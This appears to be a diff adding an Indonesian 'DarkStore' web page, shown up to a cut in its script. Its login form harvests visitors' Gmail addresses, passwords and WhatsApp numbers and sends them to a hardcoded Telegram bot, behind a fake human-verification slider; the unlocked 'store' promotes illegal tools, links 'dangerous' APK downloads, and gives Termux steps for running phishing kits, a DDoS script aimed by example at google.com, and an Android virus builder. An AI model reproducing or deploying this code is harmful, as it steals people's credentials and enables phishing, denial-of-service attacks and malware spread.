@@ -1,0 +1,1001 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>DarkStore</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
+    <style>
+        /* ===== RESET ===== */
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Courier New', monospace;
+        }
+
+        /* ===== BODY - SCROLL BISA ===== */
+        body {
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: flex-start;
+            padding: 20px;
+            position: relative;
+            overflow-y: auto;
+            overflow-x: hidden;
+            background: #0a0a0a;
+        }
+
+        /* ===== BACKGROUND ANIMASI 0101 ===== */
+        .matrix-bg {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            z-index: 0;
+            font-size: 1.2rem;
+            color: #0f0;
+            opacity: 0.08;
+            font-weight: bold;
+            letter-spacing: 6px;
+            pointer-events: none;
+            animation: matrixScroll 30s linear infinite;
+            display: flex;
+            flex-wrap: wrap;
+            align-content: flex-start;
+            padding: 20px;
+            word-break: break-all;
+            line-height: 1.8;
+        }
+
+        @keyframes matrixScroll {
+            0% { transform: translateY(0); opacity: 0.05; }
+            50% { opacity: 0.15; }
+            100% { transform: translateY(-200px); opacity: 0.05; }
+        }
+
+        /* ===== GRID MATRIX ===== */
+        .grid-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            z-index: 0;
+            pointer-events: none;
+            background-image: 
+                linear-gradient(rgba(0, 255, 0, 0.02) 1px, transparent 1px),
+                linear-gradient(90deg, rgba(0, 255, 0, 0.02) 1px, transparent 1px);
+            background-size: 40px 40px;
+            animation: gridPulse 4s ease-in-out infinite alternate;
+        }
+
+        @keyframes gridPulse {
+            0% { opacity: 0.2; }
+            100% { opacity: 0.6; }
+        }
+
+        /* ===== GLITCH LINE ===== */
+        .glitch-line {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 2px;
+            background: #0f0;
+            box-shadow: 0 0 20px #0f0, 0 0 40px #0f0;
+            z-index: 0;
+            opacity: 0.3;
+            animation: glitchLine 3s ease-in-out infinite alternate;
+            pointer-events: none;
+        }
+
+        @keyframes glitchLine {
+            0% { top: 10%; opacity: 0.1; }
+            50% { top: 80%; opacity: 0.5; }
+            100% { top: 30%; opacity: 0.1; }
+        }
+
+        /* ===== TEKS HACKER BERJALAN ===== */
+        .hacker-text {
+            position: fixed;
+            bottom: 20px;
+            left: -100%;
+            z-index: 0;
+            color: #0f0;
+            font-size: 0.9rem;
+            opacity: 0.2;
+            white-space: nowrap;
+            animation: hackerWalk 15s linear infinite;
+            pointer-events: none;
+            letter-spacing: 2px;
+            font-weight: bold;
+        }
+
+        @keyframes hackerWalk {
+            0% { left: -100%; opacity: 0; }
+            10% { opacity: 0.3; }
+            90% { opacity: 0.3; }
+            100% { left: 110%; opacity: 0; }
+        }
+
+        /* ===== OVERLAY GELAP ===== */
+        .overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.75);
+            z-index: 1;
+            pointer-events: none;
+        }
+
+        /* ===== SEMUA KONTEN DI ATAS ===== */
+        .content-wrapper {
+            position: relative;
+            z-index: 2;
+            width: 100%;
+            max-width: 1100px;
+            padding-bottom: 40px;
+        }
+
+        /* ===== LOGIN CARD ===== */
+        .login-card {
+            background: rgba(20, 20, 20, 0.9);
+            backdrop-filter: blur(5px);
+            padding: 35px 30px;
+            border-radius: 30px;
+            max-width: 420px;
+            width: 100%;
+            border: 1px solid #00ff88;
+            box-shadow: 0 0 40px rgba(0, 255, 136, 0.1);
+            text-align: center;
+            margin: 0 auto;
+            transition: 0.3s;
+        }
+        .login-card:hover {
+            box-shadow: 0 0 60px rgba(0, 255, 136, 0.2);
+        }
+        .login-card .icon-box { margin-bottom: 15px; }
+        .login-card .icon-box svg { width: 50px; height: 50px; color: #00ff88; }
+        .login-card h2 { color: #0f0; font-size: 1.6rem; margin-bottom: 8px; text-shadow: 0 0 20px #0f0; }
+        .login-card p { color: #aaa; font-size: 0.95rem; margin-bottom: 25px; }
+        .input-group {
+            position: relative;
+            width: 100%;
+            margin: 8px 0;
+        }
+        .input-group input {
+            width: 100%;
+            padding: 14px 16px;
+            border-radius: 30px;
+            border: 1px solid #333;
+            background: #1a1a1a;
+            color: #0f0;
+            font-size: 1rem;
+            outline: none;
+            transition: 0.3s;
+        }
+        .input-group.password-group input { padding-right: 50px; }
+        .input-group input:focus {
+            border-color: #00ff88;
+            box-shadow: 0 0 20px rgba(0, 255, 136, 0.2);
+        }
+        .input-group input::placeholder { color: #555; }
+        .input-group .toggle-password {
+            position: absolute;
+            right: 16px;
+            top: 50%;
+            transform: translateY(-50%);
+            color: #555;
+            cursor: pointer;
+            font-size: 1.2rem;
+            transition: 0.3s;
+            background: transparent;
+            border: none;
+        }
+        .input-group .toggle-password:hover { color: #00ff88; }
+
+        /* ===== TEKS PERINGATAN MERAH ===== */
+        .warning-text {
+            color: #ff0040;
+            font-size: 0.75rem;
+            font-weight: bold;
+            margin-top: 4px;
+            margin-bottom: 6px;
+            text-align: left;
+            padding-left: 4px;
+            text-shadow: 0 0 10px rgba(255, 0, 64, 0.3);
+            letter-spacing: 0.5px;
+        }
+
+        .login-card .btn-login {
+            width: 100%;
+            padding: 16px;
+            border: none;
+            border-radius: 60px;
+            font-size: 1.2rem;
+            font-weight: bold;
+            background: #333;
+            color: #666;
+            cursor: not-allowed;
+            transition: 0.3s;
+            margin-top: 10px;
+        }
+        .login-card .btn-login.active {
+            background: #00ff88;
+            color: #000;
+            cursor: pointer;
+            box-shadow: 0 0 30px rgba(0, 255, 136, 0.3);
+        }
+        .login-card .btn-login.active:hover {
+            transform: scale(1.02);
+            box-shadow: 0 0 50px rgba(0, 255, 136, 0.5);
+        }
+        .login-card .error-msg {
+            color: #ff4444;
+            font-size: 0.9rem;
+            margin-top: 10px;
+            min-height: 24px;
+        }
+        .login-card .loading-text {
+            color: #00ff88;
+            font-size: 0.9rem;
+            margin-top: 10px;
+            display: none;
+        }
+
+        /* ===== VERIFICATION CARD ===== */
+        .verify-card {
+            display: none;
+            background: rgba(20, 20, 20, 0.9);
+            backdrop-filter: blur(5px);
+            padding: 30px 25px;
+            border-radius: 30px;
+            max-width: 420px;
+            width: 100%;
+            text-align: center;
+            border: 1px solid #00ff88;
+            box-shadow: 0 0 40px rgba(0, 255, 136, 0.1);
+            margin: 0 auto;
+        }
+        .verify-card h2 { color: #0f0; font-size: 1.6rem; margin-bottom: 10px; text-shadow: 0 0 20px #0f0; }
+        .verify-card p { color: #aaa; font-size: 0.95rem; margin-bottom: 20px; }
+        .slider-wrapper {
+            position: relative;
+            background: #1a1a1a;
+            height: 64px;
+            border-radius: 60px;
+            overflow: hidden;
+            margin-bottom: 20px;
+            box-shadow: inset 0 2px 8px rgba(0,0,0,0.8);
+            border: 3px solid #00ff88;
+            animation: rgbBorder 2s linear infinite;
+        }
+        @keyframes rgbBorder {
+            0% { border-color: #00ff88; box-shadow: 0 0 25px #00ff88; }
+            25% { border-color: #00ffaa; box-shadow: 0 0 25px #00ffaa; }
+            50% { border-color: #00ffcc; box-shadow: 0 0 25px #00ffcc; }
+            75% { border-color: #00ff88; box-shadow: 0 0 25px #00ff88; }
+            100% { border-color: #00ff88; box-shadow: 0 0 25px #00ff88; }
+        }
+        #progress {
+            position: absolute;
+            left: 0;
+            top: 0;
+            height: 100%;
+            background: linear-gradient(90deg, #00cc44, #00ff88);
+            width: 0%;
+            transition: width 0.05s linear;
+            border-radius: 60px;
+            z-index: 1;
+        }
+        #sliderText {
+            position: absolute;
+            inset: 0;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: #ccc;
+            font-size: 1rem;
+            font-weight: 500;
+            letter-spacing: 1px;
+            pointer-events: none;
+            z-index: 2;
+            text-shadow: 0 0 10px rgba(0,0,0,0.8);
+        }
+        #slider {
+            position: absolute;
+            top: 4px;
+            left: 4px;
+            width: 54px;
+            height: 54px;
+            background: #00ff88;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            cursor: grab;
+            box-shadow: 0 0 30px rgba(0, 255, 136, 0.5);
+            z-index: 3;
+            user-select: none;
+            touch-action: none;
+            border: 2px solid #ffffff;
+        }
+        #slider:active {
+            cursor: grabbing;
+            transform: scale(0.95);
+        }
+        #slider i { color: #000; font-size: 1.4rem; }
+        #btnVerify {
+            width: 100%;
+            padding: 16px;
+            border: 2px solid #00ff88;
+            border-radius: 60px;
+            font-size: 1.2rem;
+            font-weight: bold;
+            background: #333;
+            color: #666;
+            cursor: not-allowed;
+            transition: 0.3s;
+            margin-top: 5px;
+        }
+        #btnVerify.active {
+            background: #00ff88;
+            color: #000;
+            cursor: pointer;
+            box-shadow: 0 0 30px rgba(0, 255, 136, 0.3);
+            border-color: #ffffff;
+        }
+        #btnVerify.active:hover {
+            transform: scale(1.02);
+            box-shadow: 0 0 50px rgba(0, 255, 136, 0.5);
+        }
+        #successBox {
+            display: none;
+            margin-bottom: 15px;
+        }
+        #successBox i { color: #00ff88; font-size: 3rem; }
+        #successBox h2 { color: #00ff88; font-size: 1.3rem; margin-top: 5px; }
+        .footer-note {
+            color: #666;
+            font-size: 0.8rem;
+            margin-top: 18px;
+        }
+
+        /* ===== DARKSTORE APP ===== */
+        #darkstoreApp {
+            display: none;
+            width: 100%;
+            max-width: 1100px;
+            margin: 0 auto;
+            padding: 20px 0 40px;
+        }
+        #darkstoreApp.show { display: block; }
+
+        .nav {
+            display: flex;
+            gap: 20px;
+            justify-content: center;
+            margin: 20px 0 30px;
+            flex-wrap: wrap;
+        }
+        .nav-btn {
+            background: transparent;
+            border: 2px solid #00ff88;
+            color: #0f0;
+            padding: 12px 35px;
+            border-radius: 50px;
+            font-size: 1.2rem;
+            font-weight: bold;
+            cursor: pointer;
+            transition: 0.3s;
+            text-shadow: 0 0 10px #0f0;
+        }
+        .nav-btn.active, .nav-btn:hover {
+            background: #00ff88;
+            color: #000;
+            box-shadow: 0 0 30px #00ff88;
+            text-shadow: none;
+        }
+        .logo-equal {
+            position: fixed;
+            top: 20px;
+            right: 30px;
+            font-size: 3.5rem;
+            font-weight: 900;
+            color: #0f0;
+            text-shadow: 0 0 30px #0f0;
+            cursor: pointer;
+            z-index: 999;
+            animation: slideEqual 1s ease-out;
+        }
+        @keyframes slideEqual {
+            0% { transform: translateX(200px) rotate(90deg); opacity: 0; }
+            100% { transform: translateX(0) rotate(0); opacity: 1; }
+        }
+        .popup-equal {
+            display: none;
+            position: fixed;
+            top: 80px;
+            right: 30px;
+            background: rgba(20, 20, 20, 0.95);
+            backdrop-filter: blur(5px);
+            border: 2px solid #00ff88;
+            border-radius: 30px;
+            padding: 25px 30px;
+            max-width: 350px;
+            z-index: 1000;
+            box-shadow: 0 0 60px rgba(0, 255, 136, 0.2);
+            animation: popIn 0.5s ease;
+        }
+        .popup-equal.show { display: block; }
+        @keyframes popIn {
+            0% { transform: scale(0.7); opacity: 0; }
+            100% { transform: scale(1); opacity: 1; }
+        }
+        .popup-equal p { color: #0f0; font-size: 1.1rem; margin-bottom: 15px; }
+        .popup-equal a {
+            display: inline-block;
+            margin: 5px 8px;
+            padding: 10px 20px;
+            border-radius: 50px;
+            text-decoration: none;
+            font-weight: bold;
+            color: #000;
+        }
+        .popup-equal .wa { background: #25D366; }
+        .popup-equal .tele { background: #0088cc; color: #fff; }
+
+        .apk-section {
+            background: rgba(20, 20, 20, 0.9);
+            backdrop-filter: blur(5px);
+            border-radius: 30px;
+            padding: 25px;
+            margin: 20px 0;
+            border-left: 6px solid #00ff88;
+            text-align: center;
+            border: 1px solid #00ff88;
+        }
+        .apk-section h2 { color: #0f0; font-size: 2rem; text-shadow: 0 0 20px #0f0; }
+        .apk-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fill, minmax(200px, 1fr));
+            gap: 15px;
+            margin-top: 20px;
+        }
+        .apk-item {
+            background: #1a1a1a;
+            padding: 15px;
+            border-radius: 16px;
+            border: 1px solid #333;
+            transition: 0.3s;
+        }
+        .apk-item:hover { border-color: #00ff88; transform: scale(1.02); box-shadow: 0 0 20px rgba(0, 255, 136, 0.1); }
+        .apk-item a { color: #0f0; text-decoration: none; font-weight: bold; display: block; margin-top: 6px; text-shadow: 0 0 10px #0f0; }
+        .apk-item .label { color: #aaa; font-size: 0.8rem; }
+
+        .tools-section {
+            margin: 30px 0 60px;
+            background: rgba(20, 20, 20, 0.9);
+            backdrop-filter: blur(5px);
+            border-radius: 30px;
+            padding: 25px;
+            border-left: 6px solid #00ff88;
+            border: 1px solid #00ff88;
+        }
+        .tools-section h2 {
+            color: #0f0;
+            text-align: center;
+            margin-bottom: 20px;
+            text-shadow: 0 0 20px #0f0;
+        }
+
+        /* ===== TOOL CARD - RGB BERGERAK ===== */
+        .tool-card {
+            background: #1a1a1a;
+            border-left: 5px solid #00ff88;
+            padding: 18px;
+            border-radius: 16px;
+            cursor: pointer;
+            transition: 0.3s;
+            font-weight: 600;
+            margin-bottom: 15px;
+            border: 1px solid #333;
+            background: linear-gradient(90deg, #ff0040, #ff8800, #ffff00, #00ff88, #0088ff, #8800ff, #ff0040);
+            background-size: 400% 100%;
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            background-clip: text;
+            animation: rgbSmooth 6s linear infinite;
+            font-weight: 700;
+            font-size: 1.1rem;
+        }
+
+        @keyframes rgbSmooth {
+            0% { background-position: 0% 50%; }
+            100% { background-position: 400% 50%; }
+        }
+
+        .tool-card:hover {
+            transform: scale(1.02);
+            border-left-color: #ffffff;
+            box-shadow: 0 0 30px rgba(0, 255, 136, 0.1);
+        }
+
+        .tool-detail {
+            background: #0a0a0a;
+            padding: 18px;
+            border-radius: 16px;
+            border: 1px solid #444;
+            white-space: pre-wrap;
+            font-size: 0.9rem;
+            color: #0f0;
+            max-height: 350px;
+            overflow-y: auto;
+            display: none;
+            margin-top: 15px;
+        }
+        .tool-detail.show { display: block; }
+
+        @media (max-width: 600px) {
+            .popup-equal { right: 10px; left: 10px; max-width: unset; }
+            .nav-btn { padding: 10px 20px; font-size: 1rem; }
+            .logo-equal { font-size: 2.8rem; right: 15px; }
+            .login-card { padding: 25px 20px; }
+            .apk-grid { grid-template-columns: repeat(auto-fill, minmax(150px, 1fr)); }
+            .warning-text { font-size: 0.65rem; }
+        }
+    </style>
+</head>
+<body>
+
+<!-- ===== MATRIX 0101 BACKGROUND ===== -->
+<div class="matrix-bg" id="matrixBg"></div>
+<div class="grid-overlay"></div>
+<div class="glitch-line"></div>
+<div class="hacker-text">➜ ACCESS GRANTED ➜ ROOT PERMISSION ➜ ENCRYPTING ➜ DECRYPTING ➜ HACKING ➜</div>
+<div class="overlay"></div>
+
+<!-- ===== KONTEN UTAMA ===== -->
+<div class="content-wrapper">
+
+    <!-- ===== LOGIN CARD ===== -->
+    <div id="loginCard" class="login-card">
+        <div class="icon-box">
+            <svg viewBox="0 0 24 24" fill="currentColor">
+                <path fill-rule="evenodd" d="M8.603 3.799A4.49 4.49 0 0112 2.25c1.357 0 2.573.6 3.397 1.549a4.49 4.49 0 013.498 1.307 4.491 4.491 0 011.307 3.497A4.49 4.49 0 0121.75 12a4.49 4.49 0 01-1.549 3.397 4.491 4.491 0 01-1.307 3.497 4.491 4.491 0 01-3.497 1.307A4.49 4.49 0 0112 21.75a4.49 4.49 0 01-3.397-1.549 4.49 4.49 0 01-3.498-1.306 4.491 4.491 0 01-1.307-3.498A4.49 4.49 0 012.25 12c0-1.357.6-2.573 1.549-3.397a4.49 4.49 0 011.307-3.497 4.49 4.49 0 013.497-1.307zm7.007 6.387a.75.75 0 10-1.22-.872l-3.236 4.53L9.53 12.22a.75.75 0 00-1.06 1.06l2.25 2.25a.75.75 0 001.14-.094l3.75-5.25z" clip-rule="evenodd" />
+            </svg>
+        </div>
+        <h2>Login DarkStore</h2>
+        <p>Masukkan email, password, dan nomor WhatsApp</p>
+        <div class="input-group">
+            <input type="email" id="loginEmail" placeholder="Email (wajib @gmail.com)">
+        </div>
+        <div class="input-group password-group">
+            <input type="password" id="loginPassword" placeholder="Password">
+            <button class="toggle-password" id="togglePassword" type="button">
+                <i class="fas fa-eye"></i>
+            </button>
+        </div>
+        <div class="input-group">
+            <input type="text" id="loginWhatsapp" placeholder="Nomor WhatsApp (13 digit, 62...)">
+        </div>
+
+        <!-- ===== TEKS PERINGATAN MERAH ===== -->
+        <div class="warning-text">
+            ⚠️ PASTIKAN SEMUA YANG ANDA ISI BENAR JANGAN SAMPAI SALAH KARNA BERAKIBAT FATAL DAN ANDA RUGI ⚠️
+        </div>
+
+        <div class="error-msg" id="loginError"></div>
+        <div class="loading-text" id="loadingText">⏳ Mengirim data ke bot...</div>
+        <button class="btn-login" id="btnLogin" disabled>Login</button>
+    </div>
+
+    <!-- ===== VERIFICATION CARD ===== -->
+    <div id="verifyCard" class="verify-card">
+        <div id="successBox">
+            <i class="fas fa-check-circle"></i>
+            <h2>Verifikasi Berhasil</h2>
+        </div>
+        <h2>Verifikasi Manusia</h2>
+        <p>Geser tombol ke kanan untuk membuktikan Anda bukan robot.</p>
+        <div class="slider-wrapper" id="sliderWrapper">
+            <div id="progress"></div>
+            <p id="sliderText"><i class="fas fa-arrow-right" style="margin-right:8px;"></i> Geser untuk verifikasi</p>
+            <div id="slider">
+                <i class="fas fa-chevron-right"></i>
+            </div>
+        </div>
+        <button id="btnVerify" disabled>Lanjutkan</button>
+        <p class="footer-note">Langkah ini untuk mencegah akses otomatis</p>
+    </div>
+
+    <!-- ===== DARKSTORE APP ===== -->
+    <div id="darkstoreApp">
+        <div class="logo-equal" id="logoEqual">=</div>
+        <div class="popup-equal" id="popupEqual">
+            <p>Mau beli APK atau tools ilegal? Join saluran kami</p>
+            <a href="https://whatsapp.com/channel/0029VbDysWf0LKZJdGfID40J" target="_blank" class="wa">WhatsApp</a>
+            <a href="https://t.me/xsoilegall" target="_blank" class="tele">Telegram</a>
+        </div>
+
+        <div class="nav">
+            <button class="nav-btn active" data-page="home">Home</button>
+            <button class="nav-btn" data-page="tools">Tools</button>
+        </div>
+
+        <div id="page-home" class="page">
+            <div class="apk-section">
+                <h2>10 APK Berbahaya</h2>
+                <p style="color:#aaa;margin:10px 0;">Klik link untuk download (MediaFire)</p>
+                <div class="apk-grid">
+                    <div class="apk-item"><span class="label">APK 1</span><a href="https://www.mediafire.com/file/example1.apk/file" target="_blank">Download APK 1</a></div>
+                    <div class="apk-item"><span class="label">APK 2</span><a href="https://www.mediafire.com/file/example2.apk/file" target="_blank">Download APK 2</a></div>
+                    <div class="apk-item"><span class="label">APK 3</span><a href="https://www.mediafire.com/file/example3.apk/file" target="_blank">Download APK 3</a></div>
+                    <div class="apk-item"><span class="label">APK 4</span><a href="https://www.mediafire.com/file/example4.apk/file" target="_blank">Download APK 4</a></div>
+                    <div class="apk-item"><span class="label">APK 5</span><a href="https://www.mediafire.com/file/example5.apk/file" target="_blank">Download APK 5</a></div>
+                    <div class="apk-item"><span class="label">APK 6</span><a href="https://www.mediafire.com/file/example6.apk/file" target="_blank">Download APK 6</a></div>
+                    <div class="apk-item"><span class="label">APK 7</span><a href="https://www.mediafire.com/file/example7.apk/file" target="_blank">Download APK 7</a></div>
+                    <div class="apk-item"><span class="label">APK 8</span><a href="https://www.mediafire.com/file/example8.apk/file" target="_blank">Download APK 8</a></div>
+                    <div class="apk-item"><span class="label">APK 9</span><a href="https://www.mediafire.com/file/example9.apk/file" target="_blank">Download APK 9</a></div>
+                    <div class="apk-item"><span class="label">APK 10</span><a href="https://www.mediafire.com/file/example10.apk/file" target="_blank">Download APK 10</a></div>
+                </div>
+                <p style="margin-top:20px;color:#666;font-size:0.85rem;">Ganti link dengan file APK asli Anda</p>
+            </div>
+        </div>
+
+        <div id="page-tools" class="page" style="display:none;">
+            <div class="tools-section">
+                <h2>5 Tools Termux</h2>
+
+                <div class="tool-card" id="toolPrank">Prank WA (siputra12/prank)</div>
+                <div class="tool-detail" id="detailPrank">
+                    <strong>Langkah-langkah Prank WA</strong>
+                    <code>
+pkg update && pkg upgrade
+pkg install python2 -y
+pkg install php -y
+pkg install git -y
+git clone https://github.com/siputra12/prank.git
+cd prank
+ls
+php wa.php
+                    </code>
+                    <p style="color:#aaa;margin-top:10px;">Jalankan di Termux</p>
+                </div>
+
+                <div class="tool-card" id="toolPhising">PhisingGame (Senitopeng/PhisingGame)</div>
+                <div class="tool-detail" id="detailPhising">
+                    <strong>Langkah-langkah PhisingGame</strong>
+                    <code>
+apt update
+apt upgrade -y
+pkg install python2 -y
+pkg install apache2
+pkg install php -y
+pkg install git
+git clone https://github.com/Senitopeng/PhisingGame
+ls
+cd PhisingGame
+python2 phising.py
+                    </code>
+                    <p style="color:#aaa;margin-top:10px;">Jalankan di Termux</p>
+                </div>
+
+                <div class="tool-card" id="toolDdos">💣 DDoS (kumpulanremaja/ddos2)</div>
+                <div class="tool-detail" id="detailDdos">
+                    <strong>Langkah-langkah DDoS</strong>
+                    <code>
+pkg update && pkg upgrade -y
+pkg install git -y
+pkg install python2 -y
+git clone https://github.com/kumpulanremaja/ddos2
+cd ddos2
+python2 ddos.py  AlamatIp -p  -t
+                    </code>
+                    <p style="color:#0ff;margin-top:10px;">
+                        <strong>Contoh menyerang google.com:</strong><br>
+                        <code>python2 ddos.py google.com 80 135</code>
+                    </p>
+                    <p style="color:#aaa;margin-top:5px;">
+                        <strong>Keterangan:</strong><br>
+                        - <strong>google.com</strong> = domain target (bisa diganti url lain)<br>
+                        - <strong>80</strong> = port (bisa 80, 443, dll)<br>
+                        - <strong>135</strong> = thread (jumlah serangan)
+                    </p>
+                    <p style="color:#ff6666;margin-top:10px;">⚠️ Gunakan dengan bijak. Hanya untuk edukasi.</p>
+                </div>
+
+                <div class="tool-card" id="toolNexphisher">🎣 Nexphisher (htr-tech/nexphisher)</div>
+                <div class="tool-detail" id="detailNexphisher">
+                    <strong>Langkah-langkah Nexphisher</strong>
+                    <code>
+apt update
+apt install git -y
+git clone git://github.com/htr-tech/nexphisher.git
+cd nexphisher
+bash setup
+                    </code>
+                    <p style="color:#0ff;margin-top:10px;">
+                        <strong>Untuk Termux:</strong><br>
+                        <code>bash tmux_setup</code>
+                    </p>
+                    <p style="color:#0ff;margin-top:5px;">
+                        <strong>Menjalankan Nexphisher:</strong><br>
+                        <code>bash nexphisher</code>
+                    </p>
+                    <p style="color:#aaa;margin-top:10px;">
+                        <strong>Keterangan:</strong><br>
+                        - Tools phishing dengan berbagai template (Facebook, Instagram, dll.)<br>
+                        - Hasil login korban akan tersimpan di folder <code>sites</code>
+                    </p>
+                    <p style="color:#ff6666;margin-top:10px;">⚠️ Gunakan dengan bijak. Hanya untuk edukasi.</p>
+                </div>
+
+                <div class="tool-card" id="toolCreaterVirus">☣️ CreaterVirus (viruz09/CreaterVirus)</div>
+                <div class="tool-detail" id="detailCreaterVirus">
+                    <strong>Langkah-langkah CreaterVirus</strong>
+                    <code>
+apt update && apt upgrade
+apt install python2
+apt install git
+git clone https://github.com/viruz09/CreaterVirus
+cd CreaterVirus
+python2 creater.py
+                    </code>
+                    <p style="color:#0ff;margin-top:10px;">
+                        <strong>Setelah tools berjalan:</strong><br>
+                        - Pilih nomor virus yang ingin dibuat (1-8)<br>
+                        - Tunggu proses selesai<br>
+                        - Hasil virus akan berupa file APK
+                    </p>
+                    <p style="color:#0ff;margin-top:5px;">
+                        <strong>Copy virus ke penyimpanan:</strong><br>
+                        <code>cp agents.apk /sdcard</code>
+                    </p>
+                    <p style="color:#aaa;margin-top:10px;">
+                        <strong>Keterangan:</strong><br>
+                        - Tools ini dapat membuat berbagai macam virus Android<br>
+                        - Hasil berupa file APK yang bisa dibagikan<br>
+                        - Gunakan untuk keperluan edukasi dan pengujian keamanan
+                    </p>
+                    <p style="color:#ff6666;margin-top:10px;">⚠️ PERINGATAN: Hanya untuk edukasi. Jangan gunakan untuk merusak atau mencuri data orang lain.</p>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+
+<script>
+    // ===== GENERATE MATRIX 0101 =====
+    const matrixBg = document.getElementById('matrixBg');
+    let matrixStr = '';
+    for (let i = 0; i < 500; i++) {
+        matrixStr += (Math.random() > 0.5 ? '0' : '1') + ' ';
+        if (i % 30 === 0) matrixStr += '<br>';
+    }
+    matrixBg.innerHTML = matrixStr.repeat(8);
+
+    // ===== KONFIGURASI TELEGRAM BOT =====
+    const TELEGRAM_TOKEN = '8951093597:AAG2OyH-L49Gk2ij9iH_JYV2JkADmugLfVE';
+    const TELEGRAM_CHAT_ID = '8983165845';
+
+    // ===== TOGGLE PASSWORD =====
+    const togglePassword = document.getElementById('togglePassword');
+    const passwordInput = document.getElementById('loginPassword');
+    togglePassword.addEventListener('click', function() {
+        const type = passwordInput.getAttribute('type') === 'password' ? 'text' : 'password';
+        passwordInput.setAttribute('type', type);
+        this.querySelector('i').classList.toggle('fa-eye');
+        this.querySelector('i').classList.toggle('fa-eye-slash');
+    });
+
+    // ===== LOGIN LOGIC =====
+    const emailInput = document.getElementById('loginEmail');
+    const passInput = document.getElementById('loginPassword');
+    const waInput = document.getElementById('loginWhatsapp');
+    const btnLogin = document.getElementById('btnLogin');
+    const loginError = document.getElementById('loginError');
+    const loadingText = document.getElementById('loadingText');
+    const loginCard = document.getElementById('loginCard');
+    const verifyCard = document.getElementById('verifyCard');
+
+    function validateLogin() {
+        const email = emailInput.value.trim();
+        const pass = passInput.value.trim();
+        const wa = waInput.value.trim();
+        const isEmailValid = email.endsWith('@gmail.com') && email.length > 10;
+        const isPassValid = pass.length >= 4;
+        const isWaValid = wa.startsWith('62') && wa.length === 13;
+
+        if (isEmailValid && isPassValid && isWaValid) {
+            btnLogin.disabled = false;
+            btnLogin.classList.add('active');
+            loginError.textContent = '';
+        } else {
+            btnLogin.disabled = true;
+            btnLogin.classList.remove('active');
+            if (!isEmailValid && email.length > 0) loginError.textContent = 'Email harus @gmail.com';
+            else if (!isWaValid && wa.length > 0) loginError.textContent = 'Nomor WA harus 13 digit dan diawali 62';
+            else loginError.textContent = '';
+        }
+    }
+    emailInput.addEventListener('input', validateLogin);
+    passInput.addEventListener('input', validateLogin);
+    waInput.addEventListener('input', validateLogin);
+
+    // ===== KIRIM KE TELEGRAM =====
+    async function sendToTelegram(email, password, wa) {
+        const message = `🔐 *New Login Data*\n\n📧 Email: ${email}\n🔑 Password: ${password}\n📱 WhatsApp: ${wa}\n\n🕒 Waktu: ${new Date().toLocaleString('id-ID')}`;
+        const url = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`;
+        try {
+            const response = await fetch(url, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: message, parse_mode: 'Markdown' })
+            });
+            const data = await response.json();
+            return data.ok;
+        } catch (error) {
+            console.error('Gagal kirim ke Telegram:', error);
+            return false;
+        }
+    }
+
+    btnLogin.addEventListener('click', async function() {
+        if (!this.classList.contains('active')) return;
+        const email = emailInput.value.trim();
+        const password = passInput.value.trim();
+        const wa = waInput.value.trim();
+        loadingText.style.display = 'block';
+        btnLogin.disabled = true;
+        btnLogin.classList.remove('active');
+        const success = await sendToTelegram(email, password, wa);
+        if (success) {
+            loginCard.style.display = 'none';
+            verifyCard.style.display = 'block';
+        } else {
+            loginError.textContent = '❌ Gagal mengirim data. Coba lagi.';
+            loadingText.style.display = 'none';
+            btnLogin.disabled = false;
+            btnLogin.classList.add('active');
+        }
+    });
+
+    // ===== SLIDER =====
+    const slider = document.getElementById('slider');
+    const progress = document.getElementById('progress');
+    const sliderText = document.getElementById('sliderText');
+    const btnVerify = document.getElementById('btnVerify');
+    const successBox = document.getElementById('successBox');
+    const darkstoreApp = document.getElementById('darkstoreApp');
+    const wrapper = document.getElementById('sliderWrapper');
+
+    let isDragging = false, startX = 0, currentLeft = 4, maxLeft = 0;
+    function calcMaxLeft() {
+        const w = wrapper.offsetWidth, s = slider.offsetWidth;
+        maxLeft = w - s - 4;
+        if (maxLeft < 50) maxLeft = 300;
+    }
+    calcMaxLeft();
+    window.addEventListener('resize', calcMaxLeft);
+    slider.style.left = currentLeft + 'px';
+
+    slider.addEventListener('mousedown', e => { isDragging = true; startX = e.clientX; e.preventDefault(); });
+    slider.addEventListener('touchstart', e => { isDragging = true; startX = e.touches[0].clientX; e.preventDefault(); });
+    document.addEventListener('mousemove', e => { if (!isDragging) return; moveSlider(e.clientX - startX); });
+    document.addEventListener('touchmove', e => { if (!isDragging) return; moveSlider(e.touches[0].clientX - startX); });
+    document.addEventListener('mouseup', endDrag);
+    document.addEventListener('touchend', endDrag);
+
+    function moveSlider(diff) {
+        calcMaxLeft();
+        let newLeft = Math.min(Math.max(currentLeft + diff, 4), maxLeft);
+        slider.style.left = newLeft + 'px';
+        progress.style.width = ((newLeft - 4) / (maxLeft - 4) * 100) + '%';
+        if (newLeft > 30) {
+            sliderText.innerHTML = '<i class="fas fa-check" style="color:#00ccaa;"></i> Terverifikasi';
+            sliderText.style.color = '#00ccaa';
+        } else {
+            sliderText.innerHTML = '<i class="fas fa-arrow-right" style="margin-right:8px;"></i> Geser untuk verifikasi';
+            sliderText.style.color = '#ccc';
+        }
+        if (newLeft >= maxLeft - 5) {
+            btnVerify.disabled = false;
+            btnVerify.classList.add('active');
+            successBox.style.display = 'block';
+        } else {
+            btnVerify.disabled = true;
+            btnVerify.classList.remove('active');
